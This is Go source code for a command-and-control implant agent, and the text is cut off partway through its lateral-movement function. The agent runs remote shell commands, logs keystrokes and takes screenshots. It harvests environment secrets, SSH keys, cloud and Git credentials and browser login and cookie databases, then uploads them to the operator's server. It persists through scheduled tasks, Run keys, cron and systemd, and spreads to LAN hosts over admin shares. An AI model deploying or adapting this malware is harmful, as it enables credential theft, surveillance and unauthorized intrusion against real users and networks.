// agent.go — C2 agent, Go port (stdlib only).
//
// Build:
//
//	go build -o agent agent.go
//
// Run:
//
//	./agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> --interval 10 --jitter 2 --verbose
//	(token also accepted via C2_TOKEN env var)
//
// Only use against systems you own or are authorized to test.
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

// linux key event struct (simplified)
type inputEvent struct {
	Timestamp [16]byte // timeval
	EventType uint16
	Code      uint16
	Value     int32
}

const (
	shellTimeoutDefault  = 120 * time.Second
	outputLimit          = 12000
	keylogDumpLimit      = 8000
	keylogPollIntervalMs = 10
)

type registerBody struct {
	AgentID  string `json:"agent_id,omitempty"`
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	PID      int    `json:"pid"`
	IP       string `json:"ip"`
	Version  string `json:"version"`
	Type     string `json:"type"`
}

type checkinBody struct {
	AgentID string `json:"agent_id"`
}

type resultBody struct {
	AgentID  string `json:"agent_id"`
	TaskID   string `json:"task_id"`
	Output   string `json:"output"`
	ExitCode int    `json:"exit_code"`
	Error    string `json:"error"`
}

type c2Task struct {
	TaskID string            `json:"task_id"`
	Type   string            `json:"type"`
	Args   map[string]string `json:"args"`
}

var (
	server     string
	token      string
	agentID    string
	interval   time.Duration
	jitter     time.Duration
	verbose    bool
	stateFile  string
	httpClient = &http.Client{Timeout: 120 * time.Second}
)

// --------------------------------------------------------------- keylogger

type keyLogger struct {
	mu     sync.Mutex
	buffer strings.Builder
	active bool
	stopCh chan struct{}
}

var klog = &keyLogger{stopCh: make(chan struct{})}

func (k *keyLogger) start() string {
	k.mu.Lock()
	defer k.mu.Unlock()
	if k.active {
		return "keylogger already running"
	}
	k.active = true
	k.stopCh = make(chan struct{})
	go k.capture()
	return "keylogger started"
}

func (k *keyLogger) stop() string {
	k.mu.Lock()
	defer k.mu.Unlock()
	if !k.active {
		return "keylogger not running"
	}
	k.active = false
	close(k.stopCh)
	return "keylogger stopped"
}

func (k *keyLogger) dump() string {
	k.mu.Lock()
	defer k.mu.Unlock()
	text := k.buffer.String()
	if text == "" {
		return "(no keystrokes recorded)"
	}
	if len(text) > keylogDumpLimit {
		text = "..." + text[len(text)-keylogDumpLimit:]
	}
	return text
}

func (k *keyLogger) append(s string) {
	k.mu.Lock()
	defer k.mu.Unlock()
	k.buffer.WriteString(s)
	if k.buffer.Len() > keylogDumpLimit*2 {
		tail := k.buffer.String()[k.buffer.Len()-keylogDumpLimit:]
		k.buffer.Reset()
		k.buffer.WriteString(tail)
	}
}

func (k *keyLogger) isRunning() bool {
	k.mu.Lock()
	defer k.mu.Unlock()
	return k.active
}

func (k *keyLogger) getBufferAndClear() string {
	k.mu.Lock()
	defer k.mu.Unlock()
	text := k.buffer.String()
	k.buffer.Reset()
	if text == "" {
		return ""
	}
	if len(text) > keylogDumpLimit {
		text = "..." + text[len(text)-keylogDumpLimit:]
	}
	return text
}

func logf(format string, args ...any) {
	if verbose {
		log.Printf(format, args...)
	}
}

// ----------------------------------------------------------------- helpers

func runCmd(name string, args ...string) (string, error) {
	out, err := exec.Command(name, args...).CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

func runCmdRaw(name string, args ...string) error {
	return exec.Command(name, args...).Run()
}

func homeFile(name string) string {
	home, err := os.UserHomeDir()
	if err != nil {
		return name
	}
	return filepath.Join(home, name)
}

func localIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()
	if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
		return addr.IP.String()
	}
	return ""
}

// --------------------------------------------------------------- state

// errAgentNotFound is returned when the server no longer knows our agent_id
// (e.g. agent deleted from the dashboard); the caller must re-register.
var errAgentNotFound = errors.New("agent not found")

func loadID() {
	data, err := os.ReadFile(stateFile)
	if err != nil {
		return
	}
	var m struct {
		AgentID string `json:"agent_id"`
	}
	if json.Unmarshal(data, &m) == nil {
		agentID = m.AgentID
	}
}

func saveID() {
	data, _ := json.Marshal(map[string]string{"agent_id": agentID})
	_ = os.WriteFile(stateFile, data, 0o600)
}

// ---------------------------------------------------------------- http

func postJSON(path string, body, out any) error {
	data, _ := json.Marshal(body)
	req, err := http.NewRequest("POST", server+path, bytes.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-Token", token)
	resp, err := httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusNotFound {
		return errAgentNotFound
	}
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("server returned %d: %s", resp.StatusCode, strings.TrimSpace(string(b)))
	}
	if out != nil {
		return json.NewDecoder(resp.Body).Decode(out)
	}
	return nil
}

// ------------------------------------------------------------- lifecycle

func register() error {
	host, _ := os.Hostname()
	username := ""
	if u, err := user.Current(); err == nil {
		username = u.Username
	}
	body := registerBody{
		AgentID:  agentID,
		Hostname: host,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
		IP:       localIP(),
		Version:  "1.0",
		Type:     "Go",
	}
	var resp struct {
		AgentID string `json:"agent_id"`
	}
	if err := postJSON("/api/register", body, &resp); err != nil {
		return err
	}
	agentID = resp.AgentID
	saveID()
	logf("registered as %s", agentID)
	return nil
}

func checkin() ([]c2Task, error) {
	var resp struct {
		Tasks []c2Task `json:"tasks"`
	}
	err := postJSON("/api/checkin", checkinBody{AgentID: agentID}, &resp)
	return resp.Tasks, err
}

func report(t c2Task, res resultBody) {
	res.AgentID = agentID
	res.TaskID = t.TaskID
	if err := postJSON("/api/result", res, nil); err != nil {
		logf("failed to report result: %v", err)
	}
}

// ---------------------------------------------------------------- tasks

// runShell runs a command with a hard timeout; returns (output, exit code).
func runShell(command string, timeout time.Duration) (string, int) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", command)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	code := 0
	if err != nil {
		var ee *exec.ExitError
		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
			code = 124 // timeout, mirroring `timeout`(1)
			// Windows: CommandContext only kills cmd.exe, not the process
			// tree it spawned — taskkill /T is required to stop children.
			if runtime.GOOS == "windows" && cmd.Process != nil {
				_ = exec.Command("taskkill", "/PID", strconv.Itoa(cmd.Process.Pid), "/T", "/F").Run()
			}
		} else if errors.As(err, &ee) {
			code = ee.ExitCode()
		} else {
			code = 1
		}
	}
	text := string(out)
	if len(text) > outputLimit {
		headSize := outputLimit / 5
		tailSize := outputLimit - headSize - 40
		text = text[:headSize] + fmt.Sprintf("\n... [%d chars truncated] ...\n", len(text)-headSize-tailSize) + text[len(text)-tailSize:]
	}
	return text, code
}

func download(taskID string, args map[string]string) (string, int) {
	name := args["file"]
	if name == "" {
		name = "payload.bin"
	}
	dest := args["destination"]
	if dest == "" {
		dest = name
	}
	req, err := http.NewRequest("GET", server+"/api/files/"+taskID, nil)
	if err != nil {
		return err.Error(), 1
	}
	req.Header.Set("X-Agent-Token", token)
	resp, err := httpClient.Do(req)
	if err != nil {
		return err.Error(), 1
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Sprintf("download failed: HTTP %d", resp.StatusCode), 1
	}
	if strings.HasSuffix(dest, "/") || strings.HasSuffix(dest, `\`) {
		dest = filepath.Join(dest, filepath.Base(name))
	} else if fi, err := os.Stat(dest); err == nil && fi.IsDir() {
		dest = filepath.Join(dest, filepath.Base(name))
	}
	if dir := filepath.Dir(dest); dir != "." {
		_ = os.MkdirAll(dir, 0o755)
	}
	out, err := os.Create(dest)
	if err != nil {
		return err.Error(), 1
	}
	defer out.Close()
	n, err := io.Copy(out, resp.Body)
	if err != nil {
		return err.Error(), 1
	}
	return fmt.Sprintf("saved %d bytes to %s", n, dest), 0
}

func upload(taskID string, args map[string]string) (string, int) {
	path := args["path"]
	if path == "" {
		return "no path given", 1
	}
	file, err := os.Open(path)
	if err != nil {
		return err.Error(), 1
	}
	defer file.Close()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, err := mw.CreateFormFile("file", filepath.Base(path))
	if err != nil {
		return err.Error(), 1
	}
	if _, err := io.Copy(fw, file); err != nil {
		return err.Error(), 1
	}
	mw.Close()
	req, err := http.NewRequest("POST", server+"/api/files/"+taskID, &buf)
	if err != nil {
		return err.Error(), 1
	}
	req.Header.Set("X-Agent-Token", token)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	resp, err := httpClient.Do(req)
	if err != nil {
		return err.Error(), 1
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Sprintf("upload failed: HTTP %d", resp.StatusCode), 1
	}
	return fmt.Sprintf("uploaded %s", path), 0
}

// screenshot captures the screen to a PNG and uploads it to the server.
func screenshot(taskID string, label string) (string, int) {
	tmp, err := os.CreateTemp("", "c2shot-*.png")
	if err != nil {
		return "error: " + err.Error(), 1
	}
	shotPath := tmp.Name()
	tmp.Close()
	os.Remove(shotPath)

	var captureErr error
	if runtime.GOOS == "windows" {
		ps := "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;" +
			"$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" +
			"$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);" +
			"$g=[System.Drawing.Graphics]::FromImage($bmp);" +
			"$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);" +
			"$bmp.Save('" + shotPath + "')"
		captureErr = runCmdRaw("powershell", "-command", ps)
	} else if runtime.GOOS == "darwin" {
		captureErr = runCmdRaw("screencapture", "-x", shotPath)
	} else {
		// linux: try a chain of tools
		for _, tool := range [][]string{
			{"import", "-window", "root", shotPath},
			{"scrot", shotPath},
			{"gnome-screenshot", "-f", shotPath},
		} {
			if p, err := exec.LookPath(tool[0]); err == nil && p != "" {
				if captureErr = runCmdRaw(tool[0], tool[1:]...); captureErr == nil {
					break
				}
			}
		}
	}
	if captureErr != nil {
		os.Remove(shotPath)
		return "error: screenshot failed: " + captureErr.Error(), 1
	}
	data, err := os.ReadFile(shotPath)
	os.Remove(shotPath)
	if err != nil {
		return "error: " + err.Error(), 1
	}
	name := strings.TrimSpace(label)
	if name == "" {
		name = "screenshot"
	}
	var body bytes.Buffer
	mw := multipart.NewWriter(&body)
	fw, err := mw.CreateFormFile("file", name+".png")
	if err != nil {
		return err.Error(), 1
	}
	if _, err := fw.Write(data); err != nil {
		return err.Error(), 1
	}
	mw.Close()
	req, err := http.NewRequest("POST", server+"/api/files/"+taskID, &body)
	if err != nil {
		return err.Error(), 1
	}
	req.Header.Set("X-Agent-Token", token)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	resp, err := httpClient.Do(req)
	if err != nil {
		return err.Error(), 1
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Sprintf("screenshot upload failed: HTTP %d", resp.StatusCode), 1
	}
	return fmt.Sprintf("screenshot saved (%s.png)", name), 0
}

// ---------------------------------------------------------------- clone

type cloneWatcher struct {
	mu         sync.Mutex
	status     string
	lastCheck  string
	relaunches int
	command    string
	stop       chan struct{}
}

var (
	cloneMu sync.Mutex
	clones  = make(map[string]*cloneWatcher)
)

func nowStr() string {
	return time.Now().UTC().Format("2006-01-02 15:04:05")
}

func cloneCheckOnce(w *cloneWatcher, target string) bool {
	req, err := http.NewRequest("GET", server+"/api/clone/status/"+target, nil)
	if err != nil {
		return true
	}
	req.Header.Set("X-Agent-Token", token)
	resp, err := httpClient.Do(req)
	if err != nil {
		w.mu.Lock()
		w.status = "error"
		w.lastCheck = nowStr()
		w.mu.Unlock()
		logf("clone: status check failed: %v", err)
		return true
	}
	defer resp.Body.Close()
	switch resp.StatusCode {
	case http.StatusNotFound:
		w.mu.Lock()
		w.status = "unknown"
		w.lastCheck = "target gone"
		w.mu.Unlock()
	case http.StatusOK:
		var body struct {
			Status string `json:"status"`
		}
		_ = json.NewDecoder(resp.Body).Decode(&body)
		if body.Status == "" {
			body.Status = "unknown"
		}
		w.mu.Lock()
		w.status = body.Status
		w.lastCheck = nowStr()
		w.mu.Unlock()
		if body.Status == "dead" || body.Status == "stale" {
			select {
			case <-w.stop:
				return false
			default:
			}
			w.mu.Lock()
			command := w.command
			w.mu.Unlock()
			if command == "" {
				return true
			}
			w.mu.Lock()
			w.relaunches++
			w.mu.Unlock()
			logf("clone: target %s %s -> relaunching", target, body.Status)
			if err := cloneRelaunch(command); err != nil {
				logf("clone: relaunch failed: %v", err)
			}
		}
	default:
		w.mu.Lock()
		w.status = fmt.Sprintf("http %d", resp.StatusCode)
		w.lastCheck = nowStr()
		w.mu.Unlock()
	}
	return true
}

func cloneLoop(w *cloneWatcher, target string, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		if !cloneCheckOnce(w, target) {
			return
		}
		select {
		case <-w.stop:
			return
		case <-ticker.C:
		}
	}
}

func cloneTask(args map[string]string) (string, int) {
	action := strings.ToLower(strings.TrimSpace(args["action"]))
	if action == "" {
		action = "start"
	}
	target := strings.TrimSpace(args["target"])
	if target == "" {
		target = agentID
	}
	command := strings.TrimSpace(args["command"])
	intervalSecs := 30
	if raw := strings.TrimSpace(args["interval"]); raw != "" {
		if secs, err := strconv.Atoi(raw); err == nil && secs != 0 {
			intervalSecs = secs
		}
	}
	if intervalSecs < 5 {
		intervalSecs = 5
	}
	if intervalSecs > 3600 {
		intervalSecs = 3600
	}

	if action == "stop" {
		cloneMu.Lock()
		w := clones[target]
		cloneMu.Unlock()
		if w == nil {
			return fmt.Sprintf("clone: no watcher for %s", target), 1
		}
		close(w.stop)
		cloneMu.Lock()
		delete(clones, target)
		cloneMu.Unlock()
		return fmt.Sprintf("clone: watcher for %s stopped", target), 0
	}

	if action == "status" {
		cloneMu.Lock()
		defer cloneMu.Unlock()
		if len(clones) == 0 {
			return "clone: no watchers running", 0
		}
		lines := make([]string, 0, len(clones))
		for tid, w := range clones {
			w.mu.Lock()
			status := w.status
			lastCheck := w.lastCheck
			relaunches := w.relaunches
			command := w.command
			w.mu.Unlock()
			if command == "" {
				command = "(none)"
			}
			lines = append(lines, fmt.Sprintf("  %s: %s | last_check %s | relaunched %dx | cmd: %s",
				tid, status, lastCheck, relaunches, command))
		}
		sort.Strings(lines)
		return "clone watchers:\n" + strings.Join(lines, "\n"), 0
	}

	cloneMu.Lock()
	if _, exists := clones[target]; exists {
		cloneMu.Unlock()
		return fmt.Sprintf("clone: watcher for %s already running", target), 1
	}
	cloneMu.Unlock()
	if command == "" {
		return "clone: 'command' (relaunch cmd) required", 1
	}
	w := &cloneWatcher{
		status:    "starting",
		lastCheck: "never",
		command:   command,
		stop:      make(chan struct{}),
	}
	cloneMu.Lock()
	if _, exists := clones[target]; exists {
		cloneMu.Unlock()
		return fmt.Sprintf("clone: watcher for %s already running", target), 1
	}
	clones[target] = w
	cloneMu.Unlock()
	go cloneLoop(w, target, time.Duration(intervalSecs)*time.Second)
	return fmt.Sprintf("clone: watcher started on target %s (every %ds, restart cmd: %s)",
		target, intervalSecs, command), 0
}

// ----------------------------------------------------------------- steal

func truncateText(text string, limit int) string {
	if len(text) <= limit {
		return text
	}
	headSize := limit / 5
	tailSize := limit - headSize - 20
	return text[:headSize] + fmt.Sprintf("\n... [%d chars truncated] ...\n",
		len(text)-headSize-tailSize) + text[len(text)-tailSize:]
}

const stealMaxFile = 8 * 1024 * 1024

func stealEnv(work string) []string {
	keywords := []string{
		"token", "secret", "password", "passwd", "key=", "api", "auth",
		"aws", "azure", "google", "github", "gitlab", "slack", "discord",
		"cookie", "session", "credential", "access", "proxy", "login",
	}
	var lines []string
	for _, kv := range os.Environ() {
		eq := strings.IndexByte(kv, '=')
		if eq < 0 {
			continue
		}
		k, v := kv[:eq], kv[eq+1:]
		low := strings.ToLower(k)
		for _, w := range keywords {
			if strings.Contains(low, w) {
				lines = append(lines, k+"="+v)
				break
			}
		}
	}
	if len(lines) == 0 {
		return nil
	}
	sort.Strings(lines)
	if err := os.WriteFile(filepath.Join(work, "env.txt"),
		[]byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		return nil
	}
	return []string{"env.txt"}
}

func stealSafeCopy(src, dstDir string) bool {
	fi, err := os.Stat(src)
	if err != nil || fi.IsDir() || !fi.Mode().IsRegular() {
		return false
	}
	if fi.Size() > stealMaxFile {
		return false
	}
	if err := os.MkdirAll(dstDir, 0o700); err != nil {
		return false
	}
	in, err := os.Open(src)
	if err != nil {
		return false
	}
	defer in.Close()
	out, err := os.Create(filepath.Join(dstDir, filepath.Base(src)))
	if err != nil {
		return false
	}
	defer out.Close()
	if _, err := io.Copy(out, in); err != nil {
		return false
	}
	return true
}

func stealTokens(work string) []string {
	files := []string{
		".aws/credentials", ".aws/config",
		".git-credentials", ".netrc", ".npmrc", ".pypirc",
		".pip/pip.conf", ".config/pip/pip.conf",
		".config/gh/hosts.yml", ".config/rclone/rclone.conf",
		".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
		".docker/config.json", ".kube/config",
		".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
		".ssh/known_hosts", ".ssh/authorized_keys",
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}
	var hits []string
	for _, rel := range files {
		src := filepath.Join(home, filepath.FromSlash(rel))
		if stealSafeCopy(src, filepath.Join(work, "tokens")) {
			hits = append(hits, "tokens/"+filepath.Base(rel))
		}
	}
	return hits
}

func browserRoots() map[string]string {
	roots := make(map[string]string)
	home, _ := os.UserHomeDir()
	if runtime.GOOS == "windows" {
		la := os.Getenv("LOCALAPPDATA")
		appd := os.Getenv("APPDATA")
		for _, rel := range []string{
			"Google/Chrome/User Data",
			"Microsoft/Edge/User Data",
			"BraveSoftware/Brave-Browser/User Data",
			"Opera Software/Opera Stable",
		} {
			if la != "" {
				roots[filepath.Join(la, filepath.FromSlash(rel))] = "chromium"
			}
		}
		if appd != "" {
			roots[filepath.Join(appd, "Mozilla/Firefox/Profiles")] = "firefox"
		}
		return roots
	}
	if runtime.GOOS == "darwin" {
		base := filepath.Join(home, "Library/Application Support")
		for _, rel := range []string{"Google/Chrome", "Microsoft Edge", "BraveSoftware/Brave-Browser"} {
			roots[filepath.Join(base, filepath.FromSlash(rel))] = "chromium"
		}
		roots[filepath.Join(base, "Firefox/Profiles")] = "firefox"
		return roots
	}
	for _, rel := range []string{
		"google-chrome", "chromium", "microsoft-edge", "msedge",
		"brave-browser", "brave", "opera",
	} {
		roots[filepath.Join(home, ".config", rel)] = "chromium"
	}
	roots[filepath.Join(home, ".mozilla/firefox")] = "firefox"
	return roots
}

func stealBrowser(work string) []string {
	var hits []string
	for root, kind := range browserRoots() {
		fi, err := os.Stat(root)
		if err != nil || !fi.IsDir() {
			continue
		}
		var targets []string
		if kind == "firefox" {
			targets = []string{"cookies.sqlite", "logins.json", "key4.db", "cert9.db"}
		} else {
			targets = []string{"Login Data", "Cookies", "Web Data"}
		}
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil || info == nil || info.IsDir() || !info.Mode().IsRegular() {
				return nil
			}
			base := info.Name()
			for _, t := range targets {
				if base != t {
					continue
				}
				rel, err := filepath.Rel(root, filepath.Dir(path))
				if err != nil {
					continue
				}
				key := strings.ReplaceAll(filepath.ToSlash(rel), "/", "__")
				if stealSafeCopy(path, filepath.Join(work, "browser", kind, key)) {
					hits = append(hits, "browser/"+kind+"/"+key+"/"+base)
				}
				break
			}
			return nil
		})
	}
	return hits
}

func zipSteal(work, archive string) error {
	if p, err := exec.LookPath("zip"); err == nil && p != "" {
		cmd := exec.Command(p, "-rq", archive, ".", "-x", filepath.Base(archive))
		cmd.Dir = work
		if err := cmd.Run(); err == nil {
			return nil
		}
	}
	if p, err := exec.LookPath("tar"); err == nil && p != "" {
		cmd := exec.Command(p, "-czf", archive, "--exclude="+filepath.Base(archive), ".")
		cmd.Dir = work
		if err := cmd.Run(); err == nil {
			return nil
		}
	}
	return errors.New("no 'zip' or 'tar' tool available")
}

func postFile(taskID, path, fileName string) (int, error) {
	file, err := os.Open(path)
	if err != nil {
		return 0, err
	}
	defer file.Close()
	var body bytes.Buffer
	mw := multipart.NewWriter(&body)
	fw, err := mw.CreateFormFile("file", fileName)
	if err != nil {
		return 0, err
	}
	if _, err := io.Copy(fw, file); err != nil {
		return 0, err
	}
	mw.Close()
	req, err := http.NewRequest("POST", server+"/api/files/"+taskID, &body)
	if err != nil {
		return 0, err
	}
	req.Header.Set("X-Agent-Token", token)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	resp, err := httpClient.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	return resp.StatusCode, nil
}

func stealTask(taskID string, args map[string]string) (string, int) {
	profile := strings.ToLower(strings.TrimSpace(args["profile"]))
	if profile == "" {
		profile = "all"
	}
	if profile != "all" && profile != "env" && profile != "tokens" && profile != "browser" {
		profile = "all"
	}

	work, err := os.MkdirTemp("", "c2steal_")
	if err != nil {
		return "error: " + err.Error(), 1
	}
	defer os.RemoveAll(work)

	var manifest []string
	if profile == "all" || profile == "env" {
		logf("steal: collecting env vars")
		manifest = append(manifest, stealEnv(work)...)
	}
	if profile == "all" || profile == "tokens" {
		logf("steal: collecting token files")
		manifest = append(manifest, stealTokens(work)...)
	}
	if profile == "all" || profile == "browser" {
		logf("steal: collecting browser dbs")
		manifest = append(manifest, stealBrowser(work)...)
	}
	if len(manifest) == 0 {
		return fmt.Sprintf("steal (%s): nothing found", profile), 1
	}

	sorted := append([]string(nil), manifest...)
	sort.Strings(sorted)
	if err := os.WriteFile(filepath.Join(work, "manifest.txt"),
		[]byte(strings.Join(sorted, "\n")+"\n"), 0o600); err != nil {
		return "error: " + err.Error(), 1
	}

	archive := filepath.Join(work, "steal.zip")
	if err := zipSteal(work, archive); err != nil {
		return "error: " + err.Error(), 1
	}
	fi, err := os.Stat(archive)
	if err != nil {
		return "error: " + err.Error(), 1
	}

	code, err := postFile(taskID, archive, "steal.zip")
	if err != nil {
		return "error: " + err.Error(), 1
	}
	if code != http.StatusOK {
		return fmt.Sprintf("steal upload failed: HTTP %d", code), 1
	}

	out := fmt.Sprintf("stole %d item(s) -> steal.zip (%d bytes)\n%s",
		len(manifest), fi.Size(), strings.Join(manifest, "\n"))
	return truncateText(out, 4000), 0
}

// ------------------------------------------------------------ persistence

func copySelf(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0o755)
}

func relaunchCmd(self string) string {
	if runtime.GOOS == "windows" {
		return fmt.Sprintf(`"%s" --server %s --token %s --interval %d --jitter %d`,
			self, server, token, int(interval.Seconds()), int(jitter.Seconds()))
	}
	return fmt.Sprintf(`'%s' --server %s --token %s --interval %d --jitter %d`,
		self, server, token, int(interval.Seconds()), int(jitter.Seconds()))
}

func firstLine(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		s = strings.TrimSpace(s[:i])
	}
	return s
}

func persistenceTask(args map[string]string) (string, int) {
	self, err := os.Executable()
	if err != nil || self == "" {
		self = os.Args[0]
	}
	relaunch := relaunchCmd(self)

	var dest string
	if runtime.GOOS == "windows" {
		appdata := os.Getenv("APPDATA")
		if appdata == "" {
			appdata = os.Getenv("USERPROFILE")
		}
		if appdata == "" {
			appdata = "."
		}
		dir := filepath.Join(appdata, "Microsoft", "Windows", "c2update")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return fmt.Sprintf("persistence: failed to copy self to %s", filepath.Join(dir, "c2agent.exe")), 1
		}
		dest = filepath.Join(dir, "c2agent.exe")
	} else {
		home, err := os.UserHomeDir()
		if err != nil {
			return "persistence: failed to copy self (no home dir)", 1
		}
		dir := filepath.Join(home, ".config", "c2update")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return "persistence: failed to copy self (cannot mkdir)", 1
		}
		dest = filepath.Join(dir, filepath.Base(self))
	}
	if err := copySelf(self, dest); err != nil {
		return fmt.Sprintf("persistence: failed to copy self to %s", dest), 1
	}
	out := "persistence: copied self to " + dest

	if runtime.GOOS == "windows" {
		progdata := os.Getenv("ProgramData")
		if progdata == "" {
			progdata = os.Getenv("ALLUSERSPROFILE")
		}
		if progdata == "" {
			progdata = `C:\ProgramData`
		}
		launcherDir := filepath.Join(progdata, "c2update")
		if err := os.MkdirAll(launcherDir, 0o755); err != nil {
			return "persistence: failed to write launcher (cannot mkdir)", 1
		}
		wrapper := filepath.Join(launcherDir, "c2relaunch.cmd")
		if err := os.WriteFile(wrapper, []byte("@echo off\r\nstart \"\" /b "+relaunch+"\r\n"), 0o600); err != nil {
			return fmt.Sprintf("persistence: failed to write launcher %s", wrapper), 1
		}
		out += "\npersistence: wrote launcher " + wrapper
		ok := false
		sh, rc := runShell(`schtasks /Create /TN "c2agent-persist" /TR "`+wrapper+`" /SC ONLOGON /RL HIGHEST /F`, 60)
		if rc == 0 {
			ok = true
		} else {
			out += "\n  schtasks err: " + firstLine(sh)
			sh2, rc2 := runShell(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v c2agent /t REG_SZ /d "`+wrapper+`" /f`, 60)
			if rc2 == 0 {
				ok = true
			} else {
				out += "\n  reg err: " + firstLine(sh2)
			}
		}
		if ok {
			out += "\n  launch hook registered (schtasks)"
			return out, 0
		}
		out += "\n  no launch hook registered"
		return out, 1
	}

	okCron, okSys := false, false
	line := "@reboot " + relaunch + " # c2agent-persist"
	sh, rc := runShell(`(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo "`+line+`") | crontab -`, 60)
	if rc == 0 {
		okCron = true
	} else {
		out += "\n  crontab err: " + firstLine(sh)
	}
	home, _ := os.UserHomeDir()
	unit := filepath.Join(home, ".config", "c2update", "c2-update.service")
	unitText := "[Unit]\nDescription=c2 agent update\n\n[Service]\nType=simple\n" +
		"ExecStart=/bin/sh -c \"" + relaunch + "\"\nRestart=always\n\n[Install]\nWantedBy=default.target\n"
	if err := os.WriteFile(unit, []byte(unitText), 0o600); err != nil {
		out += "\n  systemctl err: cannot write unit " + unit
	} else {
		sh2, rc2 := runShell(`systemctl --user daemon-reload 2>&1; systemctl --user enable --now `+unit+` 2>&1`, 60)
		if rc2 == 0 {
			okSys = true
		} else {
			out += "\n  systemctl err: " + firstLine(sh2)
		}
	}
	if okCron || okSys {
		out += "\n  launch hook registered (crontab/systemd)"
		return out, 0
	}
	out += "\n  no launch hook registered"
	return out, 1
}

// ---------------------------------------------------------------- lateral

func subnetBase(ip string) string {
	pts := strings.Split(ip, ".")
	if len(pts) >= 3 {
		return pts[0] + "." + pts[1] + "." + pts[2]
	}
	return ip
}

func ipToU32(ip string) uint32 {
	var a, b, c, d int
	if _, err := fmt.Sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d); err != nil {
		return 0
	}
	if a < 0 || a > 255 || b < 0 || b > 255 || c < 0 || c > 255 || d < 0 || d > 255 {
		return 0
	}
	return uint32(a)<<24 | uint32(b)<<16 | uint32(c)<<8 | uint32(d)
}

func u32ToIP(v uint32) string {
	return fmt.Sprintf("%d.%d.%d.%d", v>>24&0xff, v>>16&0xff, v>>8&0xff, v&0xff)
}

func lanPeers(subnet string) []string {
	me := localIP()
	var base string
	if subnet = strings.TrimSpace(subnet); subnet != "" {
		base = subnetBase(subnet)
	} else if strings.Count(me, ".") == 3 {
		base = subnetBase(me)
	}
	if base == "" {
		return nil
	}
	own := ipToU32(me)
	seen := map[uint32]bool{}
	var list []uint32
	collect := func(text string) {
		for i := 0; i < len(text); i++ {
			c := text[i]
			if !((c >= '0' && c <= '9') || c == '.') {
				continue
			}
			j := i
			for j < len(text) && ((text[j] >= '0' && text[j] <= '9') || text[j] == '.') {
				j++
			}
			tok := text[i:j]
			i = j
			ip := ipToU32(tok)
			if ip == 0 || ip == own {
				continue
			}
			if ip>>24&0xff == 0 || ip>>24&0xff >= 224 {
				continue
			}
			if !strings.HasPrefix(tok, base+".") {
				continue
			}
			if !seen[ip] {
				seen[ip] = true
				list = append(list, ip)
			}
		}
	}
	out, _ := runShell("arp -a", 20)
	collect(out)
	if runtime.GOOS != "windows" {
		out2, _ := runShell("ip neigh", 20)
		collect(out2)
	}
	sort.Slice(list, func(i, j int) bool { return list[i] < list[j] })
	if len(list) > 30 {
		list = list[:30]
	}
	peers := make([]string, 0, len(list))
	for _, ip := range list {
		peers = append(peers, u32ToIP(ip))
	}
	return peers
}

func lateralDeployWin(host, user, pass, self string) string {
	name := filepath.Base(self)
	share := `\\` + host + `\admin$`
	sh, rc := runShell(`net use "`+share+`" /user:`+user+` "`+pass+`"`, 30)
	if rc != 0 {
		return "failed (net use: " + firstLine(sh) + ")"
	}
	remote := `\\` + host + `\admin$\` + name
	sh, rc = runShell(`copy /y "`+self+`" "`+remote+`"`, 60)
	if rc != 0 {
		runShell(`net use "`+share+`" /delete /y`, 20)
		return "failed (copy: " + firstLine(sh) + ")"
	}
	relaunch := `"c:\windows\` + name + `" --server ` + server + ` --token ` + token +
